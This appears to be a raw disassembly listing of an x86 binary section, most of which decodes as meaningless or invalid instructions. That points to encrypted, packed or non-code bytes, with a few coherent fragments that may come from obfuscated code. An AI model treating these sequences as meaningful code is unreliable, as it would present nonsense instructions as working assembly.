  40415a:	repz xor BYTE PTR [ecx],bl
  40415d:	mov    eax,cs
  40415f:	push   ss
  404160:	idiv   BYTE PTR [ebp-0x491e8a4b]
  404166:	mov    cl,0x16
  404168:	add    bh,BYTE PTR [eax]
  40416a:	xchg   esp,eax
  40416b:	les    ebp,FWORD PTR [edi+0x7d]
  40416e:	adc    dh,bl
  404170:	xor    dh,BYTE PTR [edx]
  404172:	ror    DWORD PTR [edi-0x6f],cl
  404175:	mov    ds:0x62521a83,al
  40417a:	xchg   DWORD PTR [ecx-0x72],eax
  40417d:	or     al,0x7b
  40417f:	mov    ebp,0xa233664b
  404184:	or     ah,bh
  404186:	push   0x32
  404188:	sub    esi,DWORD PTR [esi+eiz*4]
  40418b:	in     al,0xbd
  40418d:	jmp    0x2105d6f0
  404192:	scas   al,BYTE PTR es:[edi]
  404193:	mov    al,0xc2
  404195:	add    al,0x12
  404197:	fdivr  st,st(6)
  404199:	add    esi,DWORD PTR [ebx]
  40419b:	retf   0xbd3d
  40419e:	add    edi,ebx
  4041a0:	(bad)  
  4041a2:	or     bl,bl
  4041a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041a5:	dec    ebp
  4041a6:	into   
  4041a7:	shl    DWORD PTR [ecx+eax*8-0x2],1
  4041ab:	shr    BYTE PTR [edx-0x24462f16],1
  4041b1:	pop    DWORD PTR ds:0x7426fe48
  4041b7:	sub    bh,BYTE PTR [ecx+0x38de71d7]
  4041bd:	test   DWORD PTR [eax-0x79b41869],ebp
  4041c3:	mov    ebx,0x1ded1e24
  4041c8:	hlt    
  4041c9:	leave  
  4041ca:	inc    ebp
  4041cb:	sub    al,0xdb
  4041cd:	jbe    0x4041ea
  4041cf:	xlat   BYTE PTR ds:[ebx]
  4041d0:	sbb    bl,BYTE PTR [ebx+ebx*2-0xd]
  4041d4:	xchg   DWORD PTR [edi-0x3bddef7b],edx
  4041da:	mov    bl,cl
  4041dc:	jle    0x4041f4
  4041de:	ins    BYTE PTR es:[edi],dx
  4041df:	push   edi
  4041e0:	in     al,dx
  4041e1:	xchg   ebx,eax
  4041e2:	popa   
  4041e3:	lds    ecx,FWORD PTR [edx+0x1a320a8c]
  4041e9:	xor    dh,0xbd
  4041ec:	jl     0x4041db
  4041ee:	dec    ecx
  4041ef:	pop    ds
  4041f0:	or     BYTE PTR [edi],ch
  4041f2:	mov    eax,ds:0xfb77798e
  4041f7:	mov    ebp,0xe720c1d
  4041fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041fd:	test   al,0xa0
  4041ff:	int3   
  404200:	xlat   BYTE PTR ds:[ebx]
  404201:	cmp    DWORD PTR [esi-0x5a],esi
  404204:	or     al,BYTE PTR [ebp+0xa]
  404207:	add    edx,edi
  404209:	ret    0xe914
  40420c:	pop    ss
  40420d:	pop    esp
  40420e:	jle    0x40423c
  404210:	add    al,0xc2
  404212:	dec    edx
  404213:	in     al,0xb7
  404215:	retf   0xb8fe
  404218:	mov    ds:0x5691cf32,eax
  40421d:	lahf   
  40421e:	and    DWORD PTR [ebp-0x3ecc5d85],edi
  404224:	add    eax,esi
  404226:	mov    DWORD PTR [edx],eax
  404228:	mov    eax,DWORD PTR [ebp-0x8]
  40422b:	xor    eax,ecx
  40422d:	add    eax,esi
  40422f:	jmp    0x404374
  404234:	ffree  st(0)
  404236:	adc    BYTE PTR [ecx+esi*4-0x168e12ae],0xf2
  40423e:	mov    esi,0x4bc0a35
  404243:	iret   
  404244:	xor    al,0x18
  404246:	jo     0x4042b8
  404248:	sbb    BYTE PTR [edi+0x70],bh
  40424b:	jo     0x4041d0
  40424d:	shr    DWORD PTR [edi-0x73],1
  404250:	jb     0x40429a
  404252:	sbb    bl,BYTE PTR [esp+ebp*8-0x162f9a12]
  404259:	dec    ebp
  40425a:	int3   
  40425b:	push   ss
  40425c:	xor    eax,0xeae6cc00
  404261:	fmul   DWORD PTR [ecx]
  404263:	dec    edi
  404264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404265:	mov    ss,WORD PTR [edi-0x702ab402]
  40426b:	in     eax,0x3a
  40426d:	and    eax,0x30682f2c
  404272:	ret    
  404273:	jmp    0x81008f9e
  404278:	ds cmp cl,bh
  40427b:	ret    
  40427c:	arpl   si,di
  40427e:	or     DWORD PTR [eax+0x43e083e4],eax
  404284:	loop   0x404294
  404286:	fld    st(1)
  404288:	enter  0x13e7,0x6c
  40428c:	in     al,0x70
  40428e:	mov    edx,0x95eee42d
  404293:	mov    DWORD PTR [di],edx
  404296:	and    eax,0x9e0c6ce5
  40429b:	jp     0x4042ae
  40429d:	jge    0x4042e1
  40429f:	mov    cl,0x71
  4042a1:	pop    esi
  4042a2:	mov    bh,BYTE PTR [edi-0x7a86f224]
  4042a8:	(bad)  
  4042a9:	psraw  mm4,QWORD PTR ds:0x76a7df3f
  4042b0:	in     eax,dx
  4042b1:	(bad)
  4042b4:	push   es
  4042b5:	mov    eax,ds:0x96d87a5d
  4042ba:	(bad)  
  4042bb:	retf   
  4042bc:	stc    
  4042bd:	xchg   edi,eax
  4042be:	jae    0x4042c1
  4042c0:	push   eax
  4042c1:	xchg   edi,eax
  4042c2:	clc    
  4042c3:	sub    esi,edx
  4042c5:	in     al,dx
  4042c6:	gs add eax,0x58536f32
  4042cc:	ds loope 0x40426e
  4042cf:	out    0xe0,eax
  4042d1:	enter  0x536a,0x8e
  4042d5:	push   ecx
  4042d6:	ss cdq 
  4042d8:	mov    dl,ch
  4042da:	iret   
  4042db:	pop    edi
  4042dc:	pop    esi
  4042dd:	push   esi
  4042de:	push   ebp
  4042df:	je     0x404284
  4042e1:	mov    ds:0xc6c9ce4f,eax
  4042e6:	arpl   di,sp
  4042e8:	(bad)  
  4042e9:	jbe    0x404334
  4042eb:	xor    edx,0xec4aad40
  4042f1:	aas    
  4042f2:	inc    esp
  4042f3:	pop    edx
  4042f4:	int    0x3c
  4042f6:	sar    ah,1
  4042f8:	int3   
  4042f9:	(bad)  
  4042fa:	jo     0xa895e658
  404300:	scas   eax,DWORD PTR es:[edi]
  404301:	push   eax
  404302:	dec    ebp
  404303:	jmp    0x28817f18
  404308:	pop    eax
  404309:	sub    al,0xf1
  40430b:	push   ds
  40430c:	inc    esp
  40430d:	scas   al,BYTE PTR es:[di]
  40430f:	xor    eax,0x9cbafd7d
  404314:	cmc    
  404315:	dec    edx
  404316:	test   BYTE PTR [eax-0x5a],ah
  404319:	adc    dh,BYTE PTR [esi]
  40431b:	es dec ebx
  40431d:	or     BYTE PTR [ebx+ebx*8-0x7b9b55f2],dh
  404324:	sub    al,0x50
  404326:	outs   dx,BYTE PTR ds:[esi]
  404327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404328:	aam    0xb8
  40432a:	add    ch,BYTE PTR [edx]
  40432c:	popa   
  40432d:	mov    al,ds:0x1c23e3f4
  404332:	stos   DWORD PTR es:[edi],eax
  404333:	sbb    eax,0xd372ba68
  404338:	int3   
  404339:	and    ah,BYTE PTR [eax]
  40433b:	jl     0x4042f9
  40433d:	ins    BYTE PTR es:[edi],dx
  40433e:	dec    esp
  40433f:	test   al,0xeb
  404341:	jge    0x404316
  404343:	adc    BYTE PTR [ecx+ecx*4],bl
  404346:	lahf   
  404347:	mov    DWORD PTR [esi+0x3e50b040],esi
  40434d:	ins    DWORD PTR es:[edi],dx
  40434e:	mov    esp,DWORD PTR [edx+0x61329448]
  404354:	mov    ds:0xcd14f38b,al
  404359:	retf   
  40435a:	xchg   ch,dh
  40435c:	ds pop edi
  40435e:	mov    esp,0x7be77825
  404363:	mov    ebp,0xf1c6d73c
  404368:	clc    
  404369:	imul   ebp,DWORD PTR [ecx-0x74da9f13],0xfa8c42f1
  404373:	sbb    ecx,DWORD PTR [ecx+0x458b0845]
  404379:	or     BYTE PTR [edx-0x7557fabc],cl
  40437f:	push   ebp
  404380:	(bad)  
  404381:	cmp    al,dl
  404383:	je     0x4048da
  404389:	mov    eax,DWORD PTR [ebp+0x8]
  40438c:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404390:	jmp    0x4044d5
  404395:	scas   al,BYTE PTR es:[edi]
  404396:	or     al,0x38
  404398:	repz (bad) 
  40439b:	test   eax,0x35388951
  4043a0:	shl    esp,cl
  4043a2:	rcl    BYTE PTR [esi-0x59],0xdc
  4043a6:	daa    
  4043a7:	jo     0x404419
  4043a9:	sbb    BYTE PTR [edi+0x70],bh
  4043ac:	jo     0x404389
  4043ae:	ficom  WORD PTR [ecx+0x26]
  4043b1:	cli    
  4043b2:	push   esi
  4043b3:	dec    edx
  4043b4:	cmp    ebx,DWORD PTR [eax+0x64930ee4]
  4043ba:	inc    BYTE PTR [edi+0x4c]
  4043bd:	stos   BYTE PTR es:[edi],al
  4043be:	xchg   esp,eax
  4043bf:	hlt    
  4043c0:	xchg   ecx,eax
  4043c1:	pop    ecx
  4043c2:	das    
  4043c3:	mov    bh,0xaf
  4043c5:	cmp    BYTE PTR [esi],bh
  4043c7:	pop    ecx
  4043c8:	lds    ebp,FWORD PTR [edi+0x1a]
  4043cb:	jo     0x4043cd
  4043cd:	xchg   edx,eax
  4043ce:	test   eax,0xff1f7c2d
  4043d3:	adc    dh,BYTE PTR [ebx-0x5b217937]
  4043d9:	test   al,0x13
  4043db:	mov    cs,ebp
  4043dd:	shr    DWORD PTR [edx],0xfc
  4043e0:	inc    ebp
  4043e1:	push   edx
  4043e2:	cmp    al,0x7c
  4043e4:	pop    esp
  4043e5:	imul   ebx,DWORD PTR [eax+0x17676beb],0xffffffbe
  4043ec:	and    eax,0xf649d3da
  4043f1:	add    dh,dl
  4043f3:	push   cs
  4043f4:	and    ah,BYTE PTR [eax+0x2f5f3926]
  4043fa:	mov    esp,0x7b0ab139
  4043ff:	dec    ecx
  404400:	imul   ebx,DWORD PTR [ebx],0xc43578fd
  404406:	add    al,0x95
  404408:	xor    eax,0xec01d462
  40440d:	jmp    0x404436
  40440f:	popa   
  404410:	cdq    
  404411:	in     eax,dx
  404412:	inc    esp
  404413:	repz push ebp
  404415:	mov    bh,0x3f
  404417:	push   esp
  404418:	xor    DWORD PTR [eax],ecx
  40441a:	inc    edx
  40441b:	call   FWORD PTR [edx+edx*8-0x23]
  40441f:	call   0x9b6dc9da
  404424:	mov    dl,0x2a
  404426:	inc    eax
  404427:	shl    DWORD PTR [ebx+0x75c296d9],1
  40442d:	adc    al,BYTE PTR [esi-0x27]
  404430:	stos   BYTE PTR es:[edi],al
  404431:	cli    
  404432:	int3   
  404433:	inc    esp
  404434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404435:	push   0x5f083b7e
  40443a:	pop    eax
  40443b:	xchg   edx,eax
  40443c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40443d:	les    ebx,FWORD PTR [edi]
  40443f:	outs   dx,DWORD PTR ds:[esi]
  404440:	xchg   ebx,eax
  404441:	in     al,dx
  404442:	out    dx,eax
  404443:	nop
  404444:	sar    ch,cl
  404446:	hlt    
  404447:	fwait
  404448:	mov    ds:0xd7edfe52,eax
  40444d:	or     ecx,DWORD PTR [ebx]
  40444f:	fisub  DWORD PTR [edi+eax*1+0x24]
  404453:	test   BYTE PTR [edi],dl
  404455:	cmp    al,0xec
  404457:	sub    BYTE PTR [esi],dl
  404459:	xchg   ebx,eax
  40445a:	pop    es
  40445b:	pop    ss
  40445c:	lock push 0xffffff98
  40445f:	loope  0x4044c1
  404461:	and    BYTE PTR [ebp-0x1c],bl
  404464:	es pop ebx
  404466:	adc    BYTE PTR [eax-0x76cbd466],0x14
  40446d:	jmp    0x4044c8
  40446f:	daa    
  404470:	fmulp  st(1),st
  404472:	adc    bl,BYTE PTR [esp+ecx*1-0x80]
  404476:	or     ebx,edx
  404478:	lods   al,BYTE PTR ds:[esi]
  404479:	mov    edi,0x35ad7d1f
  40447e:	pop    ss
  40447f:	rcr    bh,0xdf
  404482:	pop    ecx
  404483:	lea    edx,[eax]
  404485:	fild   WORD PTR [ecx]
  404487:	inc    edi
  404488:	mov    DWORD PTR [eax],edi
  40448a:	(bad)  
  40448b:	mov    ecx,0x323dc228
  404490:	mov    al,0x48
  404492:	pop    edi
  404493:	adc    dh,dh
  404495:	inc    ecx
  404496:	dec    esp
  404497:	sahf   
  404498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404499:	sbb    al,0x7c
  40449b:	add    eax,0x3e9134eb
  4044a0:	jecxz  0x4044a4
  4044a2:	jp     0x40448b
  4044a4:	mov    dh,0xb7
  4044a6:	std    
  4044a7:	cld    
  4044a8:	pop    esi
  4044a9:	cmp    DWORD PTR ds:0x7097111,0xffffff8e
  4044b0:	fnstenv [eax-0x42]
  4044b3:	retf   
  4044b4:	mov    al,ds:0xbf3c0f2a
  4044b9:	pop    ss
  4044ba:	cmp    BYTE PTR [esi+0x43],0x89
  4044be:	pop    ds
  4044bf:	mov    ebp,ebx
  4044c1:	mov    ecx,0xdae9543a
  4044c6:	(bad)  
  4044c8:	sbb    DWORD PTR [edi-0x57],ebx
  4044cb:	paddb  mm2,mm4
  4044ce:	mov    bl,BYTE PTR [ecx]
  4044d0:	fwait
  4044d1:	(bad)  
  4044d2:	pusha  
  4044d3:	pop    edx
  4044d4:	dec    edi
  4044d5:	mov    edx,DWORD PTR [ebp+0xc]
  4044d8:	cmp    al,BYTE PTR [edx]
  4044da:	jne    0x404ccf
  4044e0:	mov    eax,DWORD PTR [ebp-0x8]
  4044e3:	jmp    0x404628
  4044e8:	dec    edi
  4044e9:	push   edx
  4044ea:	test   ebx,esi
  4044ec:	xor    ebx,0x16807269
  4044f2:	popa   
  4044f3:	jns    0x404532
  4044f5:	mov    DWORD PTR ds:0x7026843c,edi
  4044fb:	jo     0x404515
  4044fd:	jg     0x40456f
  4044ff:	jo     0x404503
  404501:	fmul   DWORD PTR [eax-0x3d]
  404504:	push   cs
  404505:	in     eax,dx
  404506:	cmp    dl,bl
  404508:	ror    DWORD PTR [edx-0x3dd3a2a2],0x0
  40450f:	adc    eax,0x97deced7
  404514:	adc    al,0x43
  404517:	out    dx,al
  404518:	jo     0x404563
  40451a:	jg     0x404588
  40451c:	mov    esi,0x90f6300b
  404521:	add    ebx,DWORD PTR [edx+ecx*2]
  404524:	pop    ds
  404525:	mov    al,0x17
  404527:	stos   BYTE PTR es:[edi],al
  404528:	mov    ch,0xf5
  40452a:	or     BYTE PTR [ebx],cl
  40452c:	pop    edi
  40452d:	cdq    
  40452e:	sti    
  40452f:	rcr    BYTE PTR [ecx+0x76052114],cl
  404535:	fisubr WORD PTR [ecx-0x53]
  404538:	mov    ah,0x2f
  40453a:	push   eax
  40453b:	sbb    al,BYTE PTR [ebp-0x23]
  40453e:	clc    
  40453f:	xor    DWORD PTR ss:[ebx+edx*2-0x57],ecx
  404544:	ins    DWORD PTR es:[edi],dx
  404545:	aam    0x44
  404547:	adc    BYTE PTR [ebp+eiz*4-0x2561d1b3],ah
  40454e:	es out 0x55,al
  404551:	(bad)  
  404552:	ds xchg edx,eax
  404554:	add    DWORD PTR [edx-0x42],ebx
  404557:	mov    WORD PTR [edx+0x5a],fs
  40455a:	and    edx,DWORD PTR [edi]
  40455c:	adc    cl,bh
  40455e:	ss pop esi
  404560:	imul   esp,DWORD PTR [ebx+0x3f1cb299],0xffffffb8
  404567:	ja     0x404573
  404569:	pop    ecx
  40456a:	inc    ecx
  40456b:	stc    
  40456c:	outs   dx,DWORD PTR ds:[esi]
  40456d:	push   eax
  40456e:	dec    edi
  40456f:	test   al,0x3f
  404571:	pop    ss
  404572:	jle    0x4045dd
  404574:	stos   DWORD PTR es:[edi],eax
  404575:	xchg   edi,eax
  404576:	retf   0xa5ec
  404579:	sub    esp,DWORD PTR [eax-0x61cee864]
  40457f:	push   eax
  404580:	mov    BYTE PTR [ecx-0x14a30d05],al
  404586:	and    DWORD PTR [ebx-0x50e1411f],ebx
  40458c:	push   ebp
  40458d:	add    ah,cl
  40458f:	add    bh,BYTE PTR [ecx+0x66]
  404592:	imul   ecx,DWORD PTR [ecx],0x7dd3c976
  404598:	ds push ebx
  40459a:	xchg   ebx,eax
  40459b:	fs loopne 0x40455a
  40459e:	int3   
  40459f:	sub    eax,0xc3b4d94a
  4045a4:	or     BYTE PTR [ecx],ch
  4045a6:	cmp    DWORD PTR [ebx-0x42bd2ba2],esp
  4045ac:	adc    BYTE PTR [eax-0x4ec268a7],ch
  4045b2:	inc    ebx
  4045b3:	mov    eax,0x2c34660a
  4045b8:	adc    ebp,DWORD PTR [esi]
  4045ba:	sub    DWORD PTR [edi+eax*8-0x7c],eax
  4045be:	(bad)  
  4045bf:	adc    edx,DWORD PTR [eax-0x4274b65d]
  4045c5:	(bad)  
  4045c6:	dec    esi
  4045c7:	inc    edx
  4045c8:	fldenv [eax]
  4045ca:	neg    ebx
  4045cc:	cmp    ecx,DWORD PTR [eax-0x2e756c4]
  4045d2:	mov    bl,0x7b
  4045d4:	fwait
  4045d5:	pushf  
  4045d6:	std    
  4045d7:	imul   esp,ecx,0x4d
  4045da:	pop    ebp
  4045db:	push   ecx
  4045dc:	mov    bh,0x12
  4045de:	adc    bh,BYTE PTR gs:[edx-0x296adde2]
  4045e5:	shl    BYTE PTR [esi+0x2a210185],cl
  4045eb:	nop
  4045ec:	cld    
  4045ed:	push   ss
  4045ee:	iret   
  4045ef:	std    
  4045f0:	aam    0x3a
  4045f2:	cmp    DWORD PTR [edx+ebp*2+0x389e5eb1],0xb
  4045fa:	dec    ecx
  4045fb:	sbb    al,0x26
  4045fd:	gs gs add al,0xc
  404601:	mov    edx,0x3e025d37
  404606:	in     al,0x51
  404608:	aas    
  404609:	pop    ss
  40460a:	cmp    DWORD PTR [ebp+0x1b1e29e0],ebx
  404610:	mov    cl,bl
  404612:	adc    al,0x11
  404614:	mov    eax,ds:0x73528c5e
  404619:	mov    ecx,0x673394fc
  40461e:	mov    esp,0x9dfd0a12
  404623:	mov    cl,0x2e
  404625:	jne    0x404660
  404627:	jl     0x4045b4
  404629:	push   ebp
  40462a:	or     al,0xf
  40462c:	mov    esi,0x3c13312
  404631:	(bad)  
  404632:	cmp    edx,eax
  404634:	jmp    0x404779
  404639:	mov    edi,0x915e91cc
  40463e:	gs jae 0x40462a
  404641:	nop
  404642:	sbb    eax,0x89346c86
  404647:	outs   dx,DWORD PTR ds:[esi]
  404648:	les    ebp,FWORD PTR [ebp+eiz*1+0x7f187070]
  40464f:	jo     0x4046c1
  404651:	aas    
  404652:	push   0x54c5d501
  404657:	loopne 0x404688
  404659:	sahf   
  40465a:	fwait
  40465b:	xor    ebp,DWORD PTR [ecx-0x3c]
  40465e:	xor    al,0x8f
  404660:	push   edx
  404661:	jge    0x40463a
  404663:	mov    ch,0x6c
  404665:	pop    edx
  404666:	cld    
  404667:	mov    esp,0x549b04d4
  40466c:	pop    edi
  40466d:	jno    0x404611
  40466f:	xchg   edx,eax
  404670:	inc    esp
  404671:	(bad)  
  404672:	push   ebp
  404673:	adc    BYTE PTR [edx],dh
  404675:	inc    esp
  404676:	mov    edx,esi
  404678:	xor    al,0x6b
  40467a:	and    eax,0x17d7145c
  40467f:	sbb    eax,0x6d6c82d0
  404684:	mov    bl,0x66
  404686:	inc    eax
  404687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404688:	(bad)  
  404689:	shr    BYTE PTR [edi-0x50],1
  40468c:	fld    TBYTE PTR [edx+0x699096fb]
  404692:	pop    ebx
  404693:	arpl   WORD PTR [esi-0x2f],cx
  404696:	adc    BYTE PTR [eax],cl
  404698:	icebp  
  404699:	mov    al,ds:0xdc6f7685
  40469e:	scas   eax,DWORD PTR es:[edi]
  40469f:	jl     0x404639
  4046a1:	loope  0x40462b
  4046a3:	cmp    ebp,esp
  4046a5:	mov    esi,0xaf6e9cef
  4046aa:	mov    ds:0x8584e581,al
  4046af:	int3   
  4046b0:	lahf   
  4046b1:	ins    DWORD PTR es:[edi],dx
  4046b2:	inc    ebp
  4046b3:	call   0x993b26db
  4046b8:	test   eax,0x637809f5
  4046bd:	and    eax,DWORD PTR [edi+eax*1-0x71789592]
  4046c4:	lea    ecx,[edx+0x37]
  4046c7:	(bad)  
  4046c8:	loop   0x404707
  4046ca:	cmp    DWORD PTR [edx-0x72],ebp
  4046cd:	cld    
  4046ce:	jg     0x4046d7
  4046d0:	dec    al
  4046d2:	xchg   BYTE PTR [eax-0x2f],dh
  4046d5:	pop    esi
  4046d6:	jmp    0x3592:0x3c3421c9
  4046dd:	mov    eax,ds:0x606e9d64
  4046e2:	xor    bh,dh
  4046e4:	je     0x4046ca
  4046e6:	mov    edx,DWORD PTR ds:0x3aa2935e
  4046ec:	push   eax
  4046ed:	jg     0x40469e
  4046ef:	mov    ah,0x5
  4046f1:	add    ah,0x45
  4046f4:	mov    ch,0xd7
  4046f6:	pop    esi
  4046f7:	es fwait
  4046f9:	daa    
  4046fa:	inc    ecx
  4046fb:	loop   0x404755
  4046fd:	xchg   esi,eax
  4046fe:	call   0x4afb38e7
  404703:	pop    esi
  404704:	jbe    0x40468a
  404706:	ret    0x3d54
  404709:	xchg   edi,eax
  40470a:	nop
  40470b:	sub    al,0x79
  40470d:	fild   WORD PTR [ebp+0xe732e2c]
  404713:	or     DWORD PTR [ecx-0x9],0xd22cb13c
  40471a:	imul   esi,esp,0xffffffa2
  40471d:	adc    eax,0x9d1f664
  404722:	ds in  eax,0xfd
  404725:	pop    ebp
  404726:	xchg   ecx,eax
  404727:	fldenv [eax]
  404729:	sub    eax,eax
  40472b:	shl    DWORD PTR [edx+0x55b9457d],0xdb
  404732:	mov    esp,0xe8488a2d
  404737:	ret    
  404738:	cmp    eax,0x6a354af7
  40473d:	push   esi
  40473e:	pop    esp
  40473f:	out    dx,al
  404740:	aaa    
  404741:	leave  
  404742:	in     eax,dx
  404743:	repnz push edi
  404745:	push   ebx
  404746:	sbb    ch,dl
  404748:	(bad)  
  404749:	or     eax,0x24ea0dbc
  40474e:	dec    esp
  40474f:	stc    
  404750:	xor    al,0xc5
  404752:	into   
  404753:	icebp  
  404754:	fidivr WORD PTR [edx-0x7d67dd8]
  40475a:	sbb    ebx,ebp
  40475c:	mov    ch,0x59
  40475e:	xor    BYTE PTR [edx+0x6f8a1de1],bh
  404764:	stos   DWORD PTR es:[edi],eax
  404765:	mov    ebp,0xd8370d2a
  40476a:	fdiv   QWORD PTR [ecx+eax*2+0x61092953]
  404771:	xchg   edx,eax
  404772:	repz leave 
  404774:	lahf   
  404775:	push   ebx
  404776:	fnstcw WORD PTR [ebx-0x7bf02d]
  40477c:	add    eax,DWORD PTR [eax]
  40477e:	add    bh,al
  404780:	inc    ebp
  404781:	call   0x7464515
  404786:	jmp    0x4048cb
  40478b:	aaa    
  40478c:	dec    ebp
  40478d:	rcr    DWORD PTR [edi],cl
  40478f:	jno    0x404732
  404791:	repz push ebp
  404793:	enter  0x209d,0xec
  404797:	jns    0x40479c
  404799:	xchg   edi,ebx
  40479b:	push   esp
  40479c:	and    al,0x70
  40479e:	jo     0x4047b8
  4047a0:	jg     0x404812
  4047a2:	jo     0x4047e0
  4047a4:	pop    esp
  4047a5:	jmp    FWORD PTR [esi-0x23756e39]
  4047ab:	and    DWORD PTR [esi+esi*2],ebx
  4047ae:	bound  esp,QWORD PTR [ecx-0x7671887b]
  4047b4:	add    dl,BYTE PTR [ebp-0x477b4b2]
  4047ba:	ins    DWORD PTR es:[edi],dx
  4047bb:	sti    
  4047bc:	xchg   ecx,eax
  4047bd:	cmp    al,0xc4
  4047bf:	addr16 inc esi
  4047c1:	ss jl  0x404821
  4047c4:	xor    edi,edi
  4047c6:	mov    esi,0xa9a7522d
  4047cb:	xor    BYTE PTR [edx],ch
  4047cd:	jnp    0x40480c
  4047cf:	jmp    0x930df5e2
  4047d4:	inc    edi
  4047d5:	repz ds ss enter 0x9562,0xd2
  4047dc:	and    al,0xc8
  4047de:	push   0x90d6b09c
  4047e3:	jne    0x404810
  4047e5:	push   ebx
  4047e6:	sbb    ebx,esp
  4047e8:	outs   dx,BYTE PTR ds:[esi]
  4047e9:	mov    eax,0x83060d6c
  4047ee:	or     ebp,esi
  4047f0:	adc    DWORD PTR [ebx-0x2c],edx
  4047f3:	fwait
  4047f4:	popa   
  4047f5:	inc    edi
  4047f6:	dec    edx
  4047f7:	mov    ch,0xea
  4047f9:	mov    ecx,DWORD PTR [edx+0x73de0bc4]
  4047ff:	lock push ebx
  404801:	add    BYTE PTR [ebx],dh
  404803:	int3   
  404804:	test   eax,0x2d135f8e
  404809:	adc    BYTE PTR [edx+0x2a26708c],0xa1
  404810:	mov    bh,0x2
  404812:	outs   dx,BYTE PTR ds:[esi]
  404813:	push   ds
  404814:	inc    esi
  404815:	dec    eax
  404816:	ret    
  404817:	stc    
  404818:	enter  0x7106,0x75
  40481c:	dec    ebp
  40481d:	(bad)  
  40481e:	clc    
  40481f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404820:	icebp  
  404821:	and    eax,0xffffffdf
  404824:	pushf  
  404825:	clc    
  404826:	std    
  404827:	nop
  404828:	xchg   ebx,eax
  404829:	fbld   TBYTE PTR [esi-0xb]
  40482c:	test   DWORD PTR [esi+0x7a],esp
  40482f:	inc    edx
  404830:	mov    dh,0x6
  404832:	test   BYTE PTR ds:0x3fdbf35f,dl
  404838:	mov    BYTE PTR [eax],al
  40483a:	pop    ss
  40483b:	add    eax,0xbfae6a8b
  404840:	out    0xc6,eax
  404842:	(bad)  
  404843:	mov    eax,0x8c51b57
  404848:	das    
  404849:	xchg   ecx,eax
  40484a:	dec    ebp
  40484b:	jp     0x404821
  40484d:	dec    ebx
  40484e:	pop    ecx
  40484f:	and    bh,BYTE PTR [edi]
  404851:	inc    ebp
  404852:	jb     0x40483a
  404854:	popa   
  404855:	cmp    BYTE PTR [edx-0x5f],bh
  404858:	mov    eax,ds:0x99f0e035
  40485d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40485e:	ret    
  40485f:	sbb    ebp,DWORD PTR [esi-0x607bc113]
  404865:	xor    eax,0x7fb42aa
  40486a:	(bad)  
  40486b:	lods   eax,DWORD PTR ds:[esi]
  40486c:	mov    edx,0x63b31c0
  404871:	je     0x4047ff
  404873:	sbb    eax,0x6e0b063a
  404878:	sub    DWORD PTR [esi+0x6e],edx
  40487b:	dec    esi
  40487c:	fmul   QWORD PTR [eax]
  40487e:	imul   ecx,edi,0xf7d19b8e
  404884:	sbb    BYTE PTR [edi+0x68bb3c23],bh
  40488a:	sti    
  40488b:	js     0x404883
  40488d:	sub    dl,al
  40488f:	add    al,0x65
  404891:	sub    cl,ah
  404893:	int    0x63
  404895:	js     0x4048b6
  404897:	shr    ebp,1
  404899:	push   0x406088ea
  40489e:	ja     0x404860
  4048a0:	sar    BYTE PTR [ebx-0x69],1
  4048a3:	add    al,0xa
  4048a5:	pushf  
  4048a6:	mov    esi,0xc8b61b1d
  4048ab:	shl    BYTE PTR [esi],cl
  4048ad:	or     bl,bh
  4048af:	ret    0x5016
  4048b2:	cdq    
  4048b3:	ret    
  4048b4:	jo     0x404859
  4048b6:	inc    esi
  4048b7:	push   ebx
  4048b8:	sub    al,0xc7
  4048ba:	inc    ebx
  4048bb:	leave  
  4048bc:	call   FWORD PTR [ecx]
  4048be:	ds int3 
  4048c0:	(bad)  
  4048c1:	mov    al,ds:0x25be232b
  4048c6:	aaa    
  4048c7:	mov    bl,0xc2
  4048c9:	mov    al,0xe6
  4048cb:	lea    eax,[ebp-0x18]
  4048ce:	mov    DWORD PTR [ebp-0x14],eax
  4048d1:	mov    eax,DWORD PTR [ebp-0x14]
  4048d4:	add    DWORD PTR [eax],0x705fa8f
  4048da:	mov    eax,DWORD PTR [ebp-0x10]
  4048dd:	mov    edx,DWORD PTR [ebp+0x8]
  4048e0:	xor    eax,ecx
  4048e2:	lea    eax,[eax+edx*1+0x32729c]
  4048e9:	mov    DWORD PTR [ebp+0x8],eax
  4048ec:	jmp    0x404a31
  4048f1:	mov    cl,BYTE PTR [eax]
  4048f3:	add    DWORD PTR [eax+0x12918b81],0xffffff82
  4048fa:	jecxz  0x404905
  4048fc:	or     eax,0x467028ab
  404901:	jl     0x404925
  404903:	jo     0x404975
  404905:	sbb    BYTE PTR [edi+0x70],bh
  404908:	jo     0x40495f
  40490a:	xchg   edi,eax
  40490b:	in     al,dx
  40490c:	mov    ch,BYTE PTR [ebx-0x65]
  40490f:	mov    eax,ds:0x156efe30
  404914:	pop    esi
  404915:	hlt    
  404916:	sar    DWORD PTR [edi-0x3d],1
  404919:	(bad)  
  40491b:	push   edx
  40491c:	gs inc ebp
  40491e:	cmp    al,0x2
  404920:	add    DWORD PTR [eax-0x37],ebp
  404923:	or     ch,dh
  404925:	and    DWORD PTR [edx+0x49],ebx
  404928:	test   BYTE PTR [edi+esi*1-0x48],0x5a
  40492d:	adc    al,0xf8
  40492f:	mov    al,ds:0x93e9e4ff
  404934:	jge    0x40495a
  404936:	jno    0x4048df
  404938:	cmp    dh,BYTE PTR ds:0x4717f967
  40493e:	(bad)  
  40493f:	inc    esp
  404940:	dec    edi
  404941:	or     eax,0x538985f6
  404946:	leave  
  404947:	jle    0x404929
  404949:	ins    DWORD PTR es:[edi],dx
  40494a:	mulps  xmm1,xmm0
  40494d:	push   ss
  40494e:	icebp  
  40494f:	imul   edx,DWORD PTR [ebp+0x18],0x7d1ad706
  404956:	push   DWORD PTR [eax+0x4d]
  404959:	(bad)  
  40495a:	ins    DWORD PTR es:[edi],dx
  40495b:	mov    ebp,0xed3007a6
  404960:	mov    edi,0x701424f1
  404965:	sub    edx,DWORD PTR [edx-0x19321ff9]
  40496b:	dec    BYTE PTR [eax]
